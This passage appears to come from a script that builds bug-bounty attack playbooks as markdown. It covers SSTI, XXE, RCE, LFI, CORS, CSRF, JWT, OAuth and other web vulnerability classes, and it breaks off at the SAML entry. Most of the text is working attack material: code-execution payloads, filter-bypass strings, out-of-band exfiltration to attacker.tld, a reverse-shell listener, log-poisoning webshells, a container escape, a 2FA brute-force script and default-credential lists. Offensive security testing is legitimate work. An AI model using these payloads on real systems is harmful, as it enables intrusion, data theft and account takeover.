@{System.Diagnostics.Process.Start("cmd.exe","/c id");}
@{var x = System.IO.File.ReadAllText("C:\\\\windows\\\\win.ini");}
```

### Mako (Python)
```
${self.module.cache.util.os.popen('id').read()}
<%import os%>${os.popen('id').read()}
```

### Tornado (Python)
```
{% import os %}{{os.popen('id').read()}}
```""",
"payloads": "(See exploitation section — engine-specific payloads above)",
"bypasses": """- Block lists for `__class__`, `__bases__` → use `attr` filter / dict access: `{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}`.
- Strip `()` → `request|attr('class')|attr('mro')|attr('1')`.
- Strip dots → `[]` indexing.
- Strip quotes → `request|attr(request.args.attr)` with `?attr=__class__`.""",
"chain": "SSTI → RCE → environment variables / config DB creds → DB ATO → cloud creds (env var leak) → S3 / RDS pivot.",
"tools": "tplmap (auto), Burp Backslash Powered Scanner, manual diff",
"commands": """```bash
# tplmap (clone https://github.com/epinna/tplmap)
python3 tplmap.py -u 'https://target/?name=John' --os-cmd id

# Test all engines via nuclei
nuclei -l urls.txt -t 'http/cves/' -tags ssti
```""",
"edge": "Sandbox engines (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment) — RCE escapes are CVE-tracked; reference latest.",
"triage": "Always show full RCE PoC (`id`, `hostname`, `whoami`). Triage will accept lower if sandbox proven hard.",
"severity": "9.8 typical (RCE).",
"refs": "PortSwigger SSTI Cheat Sheet • PayloadsAllTheThings/Server Side Template Injection • HackTricks SSTI"
},

"xxe_all_types.md": {
"title": "XML External Entity (XXE — Classic / Blind / OOB / SSRF / RCE via XXE)",
"identity": "Wherever the app parses XML (SOAP, OAuth/SAML metadata, SVG upload, DOCX/XLSX upload, RSS, XML APIs, OOXML, EPUB), I test for XXE — file read, SSRF, RCE in old PHP+expect.",
"detection": "Submit XML with custom DOCTYPE; observe error / response containing fetched content.",
"exploitation": """### Classic file read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### SSRF via XXE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

### Blind / OOB exfil (server doesn't reflect)
```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.tld/x.dtd"> %dtd;]>
<foo>&send;</foo>
```
attacker-hosted x.dtd:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.tld/?d=%file;'>">
%all;
```

### XInclude (when DOCTYPE blocked but server permits XInclude)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### SVG upload XXE
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

### DOCX / XLSX (zip with XML inside)
```bash
unzip doc.docx -d doc/
# edit doc/word/document.xml — add DOCTYPE
zip -r evil.docx doc/
# upload to a Word/Excel-rendering target
```

### PHP `expect://` RCE via XXE (legacy PHP with expect ext)
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<foo>&xxe;</foo>
```

### XXE + PHP filter base64 to read binary files
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/.env">
```""",
"payloads": "(See above — comprehensive)",
"bypasses": """- DOCTYPE blocked → XInclude (xmlns:xi).
- DTD external blocked but parameter entities allowed → use only parameter entities `<!ENTITY %`.
- HTTP egress blocked → use FTP via `ftp://attacker.tld/?d=%file;` (some libs).
- Encoding: utf-16 → `<?xml version="1.0" encoding="UTF-16"?>` re-encode payload.""",
"chain": "XXE → IMDS → cloud creds; XXE → /etc/passwd + /proc/self/environ → DB creds; XXE in OAuth/SAML → assertion forgery / RCE.",
"tools": "XXEinjector (Ruby), Burp ActiveScan++, manual",
"commands": """```bash
# Burp: Repeater + ActiveScan++ + Collaborator
# XXEinjector
ruby XXEinjector.rb --host=attacker.tld --httpport=8888 --file=request.txt --path=/etc/passwd
```""",
"edge": "libxml2 default in PHP/Java/Node has been hardened — many SVG renderers (ImageMagick, librsvg) still process old XML. Test office docs explicitly.",
"triage": "Show file read of `/etc/passwd` or `/etc/shadow` (if root); IMDS pivot raises severity.",
"severity": "8.5–9.5 typical.",
"refs": "PortSwigger XXE • PayloadsAllTheThings/XXE Injection • OWASP XXE Prevention"
},

"rce_all_vectors.md": {
"title": "Remote Code Execution (Command / Eval / Deserialization / Memory / Template / Header)",
"identity": "RCE is the apex bug. I scan every input for command-injection sinks; eval; deserialization; XXE-RCE; SSTI-RCE; memory-corruption; header-injection-to-RCE chains.",
"detection": "Inject `;sleep 5`, `&& sleep 5`, `$(sleep 5)`, `\\`sleep 5\\``, `|sleep 5`, `%0a sleep 5`, `\\nsleep 5\\n` — measure timing.",
"exploitation": """### OS command injection — argv variants
```
;id
&id
|id
&&id
||id
`id`
$(id)
${id}
%0aid
%0a/usr/bin/id
'$(id)'
"$(id)"
\\nid\\n
%26%26id   (& url-encoded)
```

### Common dangerous functions per language
- **PHP:** `system`, `passthru`, `shell_exec`, `exec`, `popen`, `proc_open`, `eval`, `assert`, `preg_replace('/x/e',...)`, `create_function`, `include`/`require` with user input, `\\\\backtick`
- **Python:** `os.system`, `subprocess.Popen(... shell=True)`, `eval`, `exec`, `compile`, `pickle.loads`, `yaml.load` (safe_load is OK), `__import__`
- **Node.js:** `child_process.exec` (vs `execFile`), `eval`, `Function('...')`, `vm.runInNewContext`, `require()` user-controlled
- **Java:** `Runtime.exec`, `ProcessBuilder.start`, `ScriptEngine.eval`, ObjectInputStream.readObject, JNDI lookups (Log4Shell)
- **Ruby:** `system`, `\\`backtick\\``, `Open3.popen3`, `eval`, `instance_eval`, `class_eval`, `Marshal.load`, `YAML.load`
- **Go:** `exec.Command(... "sh","-c", input)` (safe-ish without shell), template/text Execute with controllable template
- **.NET:** `Process.Start`, `cmd /c`, `XmlSerializer` with type confusion, `BinaryFormatter`, `Activator.CreateInstance` from input

### Header-injection RCE (Apache mod_cgi shellshock-style; rare today)
```
User-Agent: () { :;}; /bin/bash -c 'id'
```

### XSLT-based RCE (Saxon / Xalan)
```xml
<xsl:value-of select="java:java.lang.Runtime.getRuntime().exec('id')"/>
```

### Image-magick — old shell metachar (Imagetragick)
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.tld/`id`)'
pop graphic-context
```
(Mostly patched but still alive in legacy on-prem ImageMagick.)

### Container escape via mount of host docker.sock
```
# inside container with /var/run/docker.sock mounted
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```""",
"payloads": "(See above — pick by sink type)",
"bypasses": """- `ifs` filtering of spaces → `{cat,/etc/passwd}`, `cat$IFS/etc/passwd`, `cat<>/etc/passwd`, `cat${IFS}/etc/passwd`
- Blacklist of `cat` → `tac`, `head`, `tail`, `nl`, `more`, `less`, `c\\at`, `'c'a't'`, `c?t`
- Blacklist of `/` → `${PATH:0:1}`, `${HOME:0:1}`, `${PWD:0:1}` (= /), or `cd / && cat etc/passwd`
- Blacklist alphanumeric → POSIX `${0##*/}` (= bash), Bashfuck (no chars at all)
- Blocklist of `;` → `&&`, `||`, `|`, newline `%0a`, `%0d`, `\\r\\n`
- Length limit → `bash -c {echo,YmFzaCAtaSAmZ}|{base64,-d}|bash`
- Stdout suppressed → use OOB DNS: `nslookup $(whoami).attacker.tld`""",
"chain": "RCE → service account creds → cloud → cluster → tenant.",
"tools": "commix (auto), Burp Hackvertor, ysoserial / marshalsec / ysoserial.net for deserialization",
"commands": """```bash
# commix
commix -u 'https://target/?cmd=id' --batch

# ysoserial Java
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.tld/$(whoami)' | base64 -w0 > payload.b64

# Reverse shell catcher
nc -lvnp 4444
# OR pwncat
pwncat-cs -lp 4444
```""",
"edge": "Modern hardened apps with `execFile`/parameterized exec often feel safe but template engines (SSTI), deserialization, and dependency vulns still bite. Always test deserialization paths.",
"triage": "Always show `id`, `hostname`, `uname -a`, `cat /etc/passwd`. Don't dump customer data. PoC short.",
"severity": "9.8 (Critical) Auth-less; 8.8 if requires auth.",
"refs": "HackTricks RCE • PayloadsAllTheThings/Command Injection • GTFOBins • LOLBAS"
},

"lfi_rfi_path_traversal.md": {
"title": "Local / Remote File Inclusion / Path Traversal",
"identity": "Anywhere the app reads/serves files based on user input — query params, multipart filenames, JSON paths, archive uploads. I escalate LFI to RCE via log poisoning, session files, /proc tricks, PHP wrappers.",
"detection": "Inject `../../../../etc/passwd`, `..%2f..%2f..%2fetc%2fpasswd`, `....//....//....//etc/passwd`, etc. Observe file content in response.",
"exploitation": """### Linux paths
```
../../../../../../etc/passwd
../../../../../../etc/passwd%00
..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%c0%af..%c0%afetc%c0%afpasswd
/etc/passwd
file:///etc/passwd
/proc/self/environ
/proc/self/cmdline
/proc/self/maps
/proc/self/fd/0..255
/proc/<pid>/cmdline
/var/log/apache2/access.log         (log poisoning)
/var/log/nginx/access.log
/var/lib/php/sessions/sess_<id>      (session poisoning)
~/.ssh/id_rsa
~/.bash_history
~/.aws/credentials
/var/www/html/wp-config.php
```

### Windows paths
```
..\\..\\..\\..\\..\\windows\\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
C:\\windows\\win.ini
C:\\Users\\<user>\\.aws\\credentials
C:\\inetpub\\wwwroot\\web.config
```

### PHP wrappers (when LFI is in `include()`/`require()`)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.toupper/resource=index.php
php://input        (POST body becomes file content — RCE if include)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
expect://id        (with expect ext — rare)
zip://upload.zip%23evil.php
phar://upload.phar/evil
```

### Log poisoning to RCE
1. Inject `<?php system($_GET['c']); ?>` into log via User-Agent / Referer.
2. Include the log file: `?file=/var/log/apache2/access.log&c=id`

### Sessions poisoning to RCE (PHP)
1. Set session var with PHP code.
2. Include the session file `/var/lib/php/sessions/sess_<id>`.

### `/proc/self/environ` to RCE
1. Inject PHP into User-Agent.
2. Include `/proc/self/environ?c=id`.""",
"payloads": "(See above)",
"bypasses": """- Strip `../` once → use `....//`.
- Strip `../` recursively → `..%2f`, `%2e%2e%2f`.
- Append `.png` → null byte `%00` (PHP < 5.4) or path truncation (very long string: 4096 char `././././...`).
- Encoding: double-URL, double-decode, UTF-8 overlong (`%c0%2e%c0%2e/`).
- Whitelist of basenames → use absolute paths.
- Strip `/etc/passwd` literal → `/etc/./passwd`, `/etc//passwd`, `///etc/passwd`.""",
"chain": "LFI → RCE via wrapper / log / session / `/proc`; LFI → SSH key exfil → lateral; LFI → DB creds → escalate.",
"tools": "LFISuite, ffuf with LFI wordlist, Burp Intruder",
"commands": """```bash
# ffuf with LFI wordlist
ffuf -u 'https://target/?file=FUZZ' -w ~/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0

# LFISuite
python3 lfisuite.py
```""",
"edge": "Modern frameworks rarely have raw `include` LFI; more common is `sendFile()`-style download endpoints with traversal. Still high-impact when found.",
"triage": "Show `/etc/passwd` content; for impact, escalate to env var leak (DB / cloud creds).",
"severity": "Read-only LFI: 7.5; LFI→RCE: 9.8.",
"refs": "PortSwigger Path Traversal • PayloadsAllTheThings/File Inclusion • HackTricks LFI"
},

# placeholder for the rest — generate condensed but real content
"open_redirect.md": {
"title": "Open Redirect",
"identity": "Often dismissed as low impact, but chain-fuel: phishing, OAuth code/token theft, SSRF whitelist bypass, CSP bypass.",
"detection": "Find any param that controls a redirect: `?next=`, `?return=`, `?redirect=`, `?url=`, `?goto=`, `?target=`, `?dest=`, `?continue=`, `?rurl=`, `?returnTo=`. Probe with attacker.tld and watch `Location:` header.",
"exploitation": """- Direct: `?next=https://attacker.tld`
- Whitelist of own domain: `?next=https://attacker.tld/path%23.target.com`
- Whitelist by string match: `?next=https://attackertarget.com.attacker.tld`
- Path validation: `?next=//attacker.tld/a` (browser interprets // as scheme-relative)
- Backslash trick: `?next=https://target.com\\\\@attacker.tld`""",
"payloads": """```
//attacker.tld
//attacker.tld/%2f..
/\\\\attacker.tld
//attacker.tld@target.com
https://target.com.attacker.tld
https://target.com@attacker.tld
https:attacker.tld
https://attacker.tld/.target.com
http://attacker.tld;target.com
http://attacker.tld#@target.com
http://attacker.tld?@target.com
javascript://target.com/%0aalert(1)        (XSS in redirect → DOM XSS)
data:text/html,<script>location='https://attacker.tld'</script>
```""",
"bypasses": "Whitelist on `target.com` not anchored: `attackertarget.com`, `target.com.attacker.tld`. Whitelist on scheme: try `\\\\\\\\attacker.tld`, `//attacker.tld`. Strip query: use `#`.",
"chain": "Open Redirect → OAuth code/token exfil (when redirect_uri loosely matched) → ATO. Open Redirect → SSRF whitelist bypass. Open Redirect → CSP `script-src` bypass via redirect chain. Phishing / malware delivery.",
"tools": "openredirex, oralyzer, dalfox (--method redirection)",
"commands": """```bash
cat urls.txt | qsreplace 'https://attacker.tld' | xargs -I% curl -sk -o /dev/null -w '%{redirect_url} %{url_effective}\\n' '%' | grep attacker.tld
openredirex -l urls.txt -p ~/wordlists/redirects.txt -k FUZZ -o results.txt
```""",
"edge": "Pure same-origin redirects (in-app navigation) are not bugs. Cross-origin must be confirmed via Location header pointing offsite.",
"triage": "Chain it: redirect into login flow + steal OAuth code = P2-P3.",
"severity": "Standalone: 4.0–6.0; chained: 7.5+.",
"refs": "PortSwigger Open Redirect • PayloadsAllTheThings/Open Redirect"
},

"cors_misconfig.md": {
"title": "CORS Misconfiguration",
"identity": "Misconfigured CORS lets attacker-origin JS read authenticated victim responses → ATO via API.",
"detection": "Set `Origin: https://attacker.tld` and check `Access-Control-Allow-Origin` (ACAO) + `Access-Control-Allow-Credentials` (ACAC).",
"exploitation": """| ACAO Echo | ACAC | Exploit |
|---|---|---|
| `https://attacker.tld` | `true` | Full credentialed read; PoC fetches /api/me. |
| `*` | `false` | Public data only — usually not a bug. |
| `null` | `true` | iframe with `srcdoc` produces null origin → exploit. |
| Regex bypass | `true` | Wildcards / partial-match (`subdomain bypass`). |""",
"payloads": """```http
Origin: https://attacker.tld
Origin: null
Origin: https://target.com.attacker.tld
Origin: https://attacker.tld.target.com
Origin: https://target.com@attacker.tld
Origin: http://target.com/    (trailing slash bypass some regex)
```

PoC HTML:
```html
<script>
fetch('https://target.com/api/me', {credentials: 'include'})
  .then(r => r.text())
  .then(t => fetch('https://attacker.tld/?d=' + encodeURIComponent(t)));
</script>
```

Null-origin via iframe srcdoc:
```html
<iframe srcdoc='<script>fetch(...)</script>'></iframe>
```""",
"bypasses": "Regex `^https?://.*\\.target\\.com$` → `https://target.com.attacker.tld`. `endsWith('target.com')` → `target.com` registered as domain.",
"chain": "CORS → /api/me leak → session token / API key → ATO.",
"tools": "corsy, Burp ActiveScan++, manual",
"commands": """```bash
python3 corsy.py -u urls.txt -t 50
# Manual
curl -sk -H 'Origin: https://attacker.tld' 'https://target.com/api/me' -i | grep -i 'access-control'
```""",
"edge": "Public-data endpoints with wildcard ACAO are not bugs. ACAC must be true for credentialed exploitation.",
"triage": "Show JS PoC running in your browser fetching authenticated victim data.",
"severity": "7.5 typical when credentialed.",
"refs": "PortSwigger CORS • PayloadsAllTheThings/CORS Misconfiguration"
},

"csrf_all_types.md": {
"title": "CSRF (Classic / JSON / Same-Site=Lax / Login-CSRF / Logout-CSRF)",
"identity": "CSRF still alive when: SameSite=None, missing CSRF token, predictable token, GET state-change, JSON CSRF (Content-Type bypass), CORS-allow-credentials lapse.",
"detection": """- Remove CSRF token → does request still succeed? Yes = bug.
- Replace token with attacker's token → success = wrong validation.
- Reuse old token → success = no per-session.
- Change `Content-Type: application/json` to `text/plain` → success = JSON CSRF.
- Same-Site=Lax + GET state-change endpoint → CSRF possible.""",
"exploitation": """### Classic form CSRF
```html
<form action="https://target.com/api/email/change" method="POST">
  <input name="email" value="attacker@tld">
</form><script>document.forms[0].submit()</script>
```

### JSON CSRF via text/plain
```html
<form action="https://target.com/api/v1/payments" method="POST" enctype="text/plain">
  <input name='{"to":"attacker","amount":1000,"x":' value='"y"}'>
</form><script>document.forms[0].submit()</script>
```

### XHR-based CSRF (when CORS allows credentialed cross-origin POST)
Requires `Access-Control-Allow-Credentials: true` + `Access-Control-Allow-Origin: https://attacker.tld`.

### Login CSRF
Force victim to log in as attacker; later activity tied to attacker's account → leak victim's data into attacker's account.""",
"payloads": "(see above)",
"bypasses": """- Token stripped → succeeds → no CSRF.
- Token validated only when present → omit param → bypass.
- Token tied to user, not session → use attacker's token.
- Referer/Origin allowlist with substring match → `https://attacker.tld/target.com`.
- Referer null → submit from data: URL or via downgrade `<meta name="referrer" content="never">`.""",
"chain": "CSRF → email change → password reset → ATO. CSRF → 2FA disable → ATO.",
"tools": "Burp CSRF PoC generator, autorize",
"commands": """```bash
# Burp Engagement Tools → Generate CSRF PoC
```""",
"edge": "Same-Site=Lax default in modern Chrome means GET CSRF still works for top-level navigations; POST CSRF needs SameSite=None or no SameSite attribute.",
"triage": "Show end-to-end ATO PoC, not just \"request succeeded\".",
"severity": "ATO via CSRF: 8.0+.",
"refs": "PortSwigger CSRF • PayloadsAllTheThings/CSRF Injection"
},

"clickjacking.md": {
"title": "Clickjacking",
"identity": "UI redress via iframe + transparent overlay. Bug only when sensitive action exists & no X-Frame-Options/CSP frame-ancestors.",
"detection": "`curl -I` for `X-Frame-Options` and `CSP frame-ancestors`. Absent or weak → frame-able.",
"exploitation": """```html
<style>
  iframe { width: 1280px; height: 800px; opacity: 0.0001; position: absolute; top: 0; left: 0; }
  .lure { position: absolute; top: 350px; left: 600px; cursor: pointer; z-index: 1; }
</style>
<div class="lure">CLAIM YOUR FREE iPHONE</div>
<iframe src="https://target.com/account/delete"></iframe>
```""",
"payloads": "(see above)",
"bypasses": "Use `<object>` instead of `<iframe>` if XFO blocks iframe but not object (rare).",
"chain": "Clickjacking → 2FA disable / email change / payment auth → ATO / financial.",
"tools": "BurpClickbandit",
"commands": "Burp → Engagement Tools → Generate Clickjacking PoC",
"edge": "Only counts if exploitable action exists; clickjacking on `/about` is not a bug.",
"triage": "Show video PoC of overlay + sensitive action. Often closed Informative if no exploitable action shown.",
"severity": "4.0–6.0.",
"refs": "PortSwigger Clickjacking"
},

"idor_bola_bfla.md": {
"title": "IDOR / BOLA / BFLA (Insecure Direct Object Reference / Broken Object/Function Level Auth)",
"identity": "The most common high-bounty class in modern APIs. I substitute IDs (numeric, UUID, hash) and observe 200 vs 403.",
"detection": """1. Map all endpoints with `:id` or `userId=` style.
2. With user A's session, replace ID with user B's ID. Compare response.
3. Try: increment numeric IDs, predict UUIDs (UUIDv1 leaks MAC + time → predict), substitute admin's ID, use former IDs (deleted accounts often still resolve).
4. Method swap: `GET /api/users/123` works but `PUT /api/users/123` should be admin-only — try as user.""",
"exploitation": """- Direct ID swap: `/api/orders/12345` → `/api/orders/12346`.
- UUID brute via timing oracle (UUIDv1) or predictable shape.
- Sequential ID in JSON body: `{"userId": 1}` → `{"userId": 2}`.
- Hidden parameter inject: `{"userId": 123, "isAdmin": true}` (mass assignment).
- Method bypass: `PUT /api/users/123/role` not exposed in UI but routed.
- Plural collection: `GET /api/users?ids=1,2,3,4,5,6,7,8,9,10`.""",
"payloads": """```http
GET /api/users/<other_id>          # vertical IDOR
GET /api/orders/<other_user_order> # horizontal IDOR
GET /api/users/me                  # often "me" alias works for IDs
GET /api/users/me/../<other_id>    # traversal-style
GET /api/users.json?id[]=1&id[]=2  # array param
GET /api/admin/users/<id>          # method/path confusion
PATCH /api/users/<id> {"role":"admin"}  # BFLA + mass assignment
```""",
"bypasses": """- 403 on numeric ID → try UUID, base64-encoded ID, hash.
- 403 on direct path → query string version.
- 403 on JSON body → form body, XML body.
- 403 on `GET` → `POST` with method override `_method=GET` or `X-HTTP-Method-Override: GET`.
- IDs encoded in JWT — re-sign or alg=none if JWT vuln present (see jwt_attacks.md).""",
"chain": "IDOR → admin object access → BFLA on admin endpoint → tenant takeover.",
"tools": "Autorize (Burp), AuthMatrix, Burp Repeater + extensions",
"commands": """```bash
# Burp Autorize: log in as user A, set unauthorized headers to user B's, browse — extension flags every endpoint that returns the same to both.
```""",
"edge": "Public profile data accessible by ID is by design. Triagers look for sensitive data (PII, payment, settings).",
"triage": "Show user A obtaining user B's PII / settings / actions. Crisp screenshot.",
"severity": "Horizontal: 6.5–8.5; Vertical (BFLA): 9.0+.",
"refs": "OWASP API Top 10 — API1 BOLA, API5 BFLA • PortSwigger IDOR"
},

"auth_bypass_all_types.md": {
"title": "Authentication Bypass (logic / SQLi-in-login / SSO / SAML / OAuth / 2FA-precomputed / cache key)",
"identity": "Pre-auth bypasses are the highest-value bugs in any program. I scan login flow for parsing inconsistencies, race conditions, and cache poisoning before brute-force.",
"detection": "(see exploitation)",
"exploitation": """### Bypass via SQL/NoSQL in login
- See `sqli_all_types.md` payloads.

### Path normalization bypass
```
GET /admin                      → 403
GET /admin/                     → 200
GET /admin..;/                  → 200 (Tomcat)
GET /admin/.                    → 200
GET /%2e/admin                  → 200
GET /admin%20                   → 200
GET /;param=1/admin             → 200
GET //admin                     → 200
GET /admin#                     → 200
GET /admin?                     → 200
```

### Header-based bypass
```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Forwarded: for=127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
```

### HTTP method swap
`GET /admin` → 403 ; `POST /admin` → 200; or `OPTIONS /admin` → 200; or `TRACE` returns body.

### HTTP/2 vs HTTP/1.1 differential
WAF only inspects HTTP/1.1 → request /admin via HTTP/2.

### Same path different host
Vhost confusion: `Host: admin.target.com` from external IP if internal nginx routes by Host header.

### Default creds
```
admin / admin
admin / password
admin / 123456
admin / changeme
root / root
test / test
guest / guest
admin / target.com
admin / Spring2024!
```

### Race condition login
Submit login + 2FA confirm in the same window before MFA enforcement check.""",
"payloads": "(see above)",
"bypasses": "(method/header/path encoding/encoding tier — see above)",
"chain": "Auth bypass → ATO → tenant takeover.",
"tools": "ffuf with header wordlist; Burp Param Miner; ja3/jarm differential; sqlmap on login fields.",
"commands": """```bash
# 403 bypasser
ffuf -u 'https://target/admin' -H 'X-Original-URL: /admin' -mc 200,302
# Method bruter
for m in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE PROPFIND; do
  echo -n "$m: "; curl -sk -o /dev/null -w '%{http_code}\\n' -X $m https://target/admin
done
```""",
"edge": "Some 200 responses are actually error pages with 200 status. Check body, not just status.",
"triage": "Show authenticated-only data extracted via the bypass.",
"severity": "8.5–9.8 depending on access gained.",
"refs": "PortSwigger Auth • PayloadsAllTheThings/Authentication"
},

"2fa_mfa_bypass.md": {
"title": "2FA / MFA Bypass",
"identity": "MFA layers fail in many places: missing on critical endpoints, brute-able codes, race conditions, response manipulation, code reuse, fallback weakness.",
"detection": "Map every authenticated endpoint after MFA. Strip MFA cookie/header — does sensitive action still succeed?",
"exploitation": """1. **MFA missing on sensitive endpoints** — `/api/email/change`, `/api/2fa/disable`, `/api/password/change` reachable with auth-only cookie pre-MFA.
2. **Brute-force code** — no rate-limit on `/api/2fa/verify`. 6-digit = 10⁶; race: 100 req/sec finishes in 167min (often in scope).
3. **Response manipulation** — change `{"verified":false}` → `{"verified":true}` in response (only works if client trusts JSON, which is a bug class itself).
4. **Status code swap** — 401 → 200; client redirects on 200 only.
5. **Multiple session token reuse** — verify with one token, but the pre-MFA token still grants full access.
6. **Code reuse** — same code valid across multiple verify calls.
7. **Race condition** — submit verify + sensitive action in parallel; pre-MFA token may complete the action before MFA check.
8. **Backup code list** — predictable backup codes; or admin-resettable.
9. **SMS fallback** — request OTP via SMS to attacker number after a phone-number-change endpoint that itself is MFA-not-required.
10. **OAuth bypass** — sign in via Google account that already verifies email; 2FA enforcement may not apply to OAuth path.""",
"payloads": "(behavior-based — see above)",
"bypasses": """- Send `code: ''` (empty) — sometimes parses as bypass.
- Send `code: null` (json) — same.
- Send `code: [1,2,3]` (array) — type confusion in some frameworks.
- Send the OTP twice to verify and to reset endpoints simultaneously.
- Replace `code` with `code[]=` array.""",
"chain": "MFA bypass → ATO; or MFA bypass → admin → tenant takeover.",
"tools": "Turbo Intruder for race conditions; Burp Repeater; intruder for code brute.",
"commands": """```python
# Turbo Intruder template for code brute
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20)
    for i in range(0, 1000000):
        engine.queue(target.req, str(i).zfill(6))
def handleResponse(req, interesting):
    if 'success' in req.response or req.status == 200:
        table.add(req)
```""",
"edge": "Some 2FA failures simply set a session flag — need to chain with another request to manifest.",
"triage": "Show end-to-end ATO without OTP knowledge.",
"severity": "8.5–9.5.",
"refs": "2FA Bypass.pdf (uploaded) • HackTricks 2FA bypass • bb_kb/Account_Takeover/"
},

"jwt_attacks.md": {
"title": "JWT Attacks (alg=none / weak HS / kid injection / jku / x5u / public→private)",
"identity": "JWT is everywhere; misimplementation is everywhere. I always test alg manipulation, kid traversal, weak secret, jku/x5u override.",
"detection": """1. Decode token. Note `alg` and `kid`/`jku`/`x5u`.
2. Test `alg=none`: `{\"alg\":\"none\"}.{...}.` (empty signature).
3. Test HS256→HS512 / RS256→HS256 (signing with public key as HMAC key).
4. Test `kid` traversal: `{"kid":"../../../../dev/null"}` then sign with empty key.
5. Test `jku`/`x5u` override: point to attacker.tld JWKS.
6. Brute weak HS256 secrets with `jwt-cracker` or `hashcat -m 16500`.""",
"exploitation": """### alg=none
```
header: {"alg":"none","typ":"JWT"}
payload: {"sub":"admin","iat":...,"exp":...}
signature: (empty)
final: <b64header>.<b64payload>.
```

### RS256 → HS256 (sign with public key as HMAC secret)
```python
import jwt
pub = open('jwks_public.pem').read()
token = jwt.encode({'sub':'admin'}, pub, algorithm='HS256')
```

### kid SQL injection
```
kid: 'UNION SELECT 'AAAA'-- 
# Sign payload with HMAC-SHA256(key='AAAA')
```

### kid path traversal
```
kid: ../../../dev/null
# Sign with empty key (or known constant if /dev/null served)
```

### jku override
```
jku: https://attacker.tld/jwks.json
# Host JWKS containing attacker's RSA public key matching attacker's private key
```

### x5u override
Same as jku but `x5u` (X.509 cert URL).

### Weak secret brute
```bash
jwt_tool token -C -d /path/to/wordlist.txt
hashcat -a 0 -m 16500 token.txt rockyou.txt
```""",
"payloads": "(see above)",
"bypasses": "Mixing `alg=NONE` (caps), `alg=nOnE`, `alg=`, blank header. JSON duplicate keys: `{\"alg\":\"HS256\",\"alg\":\"none\"}` — depending on parser.",
"chain": "JWT forgery → ATO any user / role escalate.",
"tools": "jwt_tool, jwt-cracker, hashcat, jwt.io for manual",
"commands": """```bash
jwt_tool eyJhbGciOi... -T              # tamper interactive
jwt_tool eyJ... -X a                    # alg=none
jwt_tool eyJ... -X k -pk public.pem     # confused-key (RS→HS)
jwt_tool eyJ... -X i -I -pc name -pv admin   # kid sqli
jwt_tool eyJ... -X s -ju https://attacker.tld/jwks.json -pk priv.pem   # jku override
```""",
"edge": "Modern libs (PyJWT, jose, jsonwebtoken) reject alg=none unless explicitly enabled. Older libs / custom decoders bite.",
"triage": "Show forged token granting admin access in API call.",
"severity": "9.0+.",
"refs": "PortSwigger JWT • jwt_tool README • PayloadsAllTheThings/JSON Web Token"
},

# stub the rest with rich content but tighter
"oauth_misconfig.md": {
"title": "OAuth Misconfiguration",
"identity": "OAuth has 12+ classic misconfig patterns: redirect_uri lax matching, state missing/predictable, code reuse, auth-code-vs-token confusion, scope upgrade, client_secret leak, implicit flow + open redirect, account squatting via OAuth, OAuth in mobile webview without PKCE.",
"detection": "Map authorize+callback. Tamper redirect_uri, state, scope. Test code reuse. Test PKCE absence on public clients.",
"exploitation": """- **redirect_uri** — `?redirect_uri=https://attacker.tld` if validation is loose. Variants: subdomain `attacker.target.com`, path `target.com/.attacker.tld`, query `target.com?next=attacker.tld`, fragment `target.com#@attacker.tld`. Open Redirect on whitelisted domain → token exfil.
- **state missing** → CSRF on OAuth callback → account hijack.
- **code reuse** → same `code` exchanged twice yields second access_token (some IdPs).
- **scope upgrade** → request `scope=admin` even if client default is `read`; AS may grant if not enforced.
- **PKCE missing** on public client (mobile/SPA) → code interception via deep link hijack.
- **Implicit flow + open redirect** = token in fragment; open redirect carries fragment; reflected in attacker domain via `Location:` chain.
- **Account squatting** — sign up via Google with a victim's email (no email verification on social sign-up); when victim later signs up, accounts merge → ATO.""",
"payloads": "(see exploitation)",
"bypasses": "(see redirect_uri variants)",
"chain": "OAuth misconfig → token theft → ATO.",
"tools": "Burp + Hackvertor; oauth-scout; manual repeater.",
"commands": """```bash
# Test redirect_uri
curl -sk "https://idp/auth?response_type=code&client_id=X&redirect_uri=https://attacker.tld&scope=openid&state=Y"
# Watch response Location header
```""",
"edge": "Some IdPs do exact match — bypass requires registering attacker subdomain on whitelist domain or finding open redirect there.",
"triage": "Always show end-to-end ATO PoC.",
"severity": "8.5–9.8.",
"refs": "PortSwigger OAuth • RFC 6749/6819 • Authzed OAuth pitfalls"
},

"saml_attacks.md": {
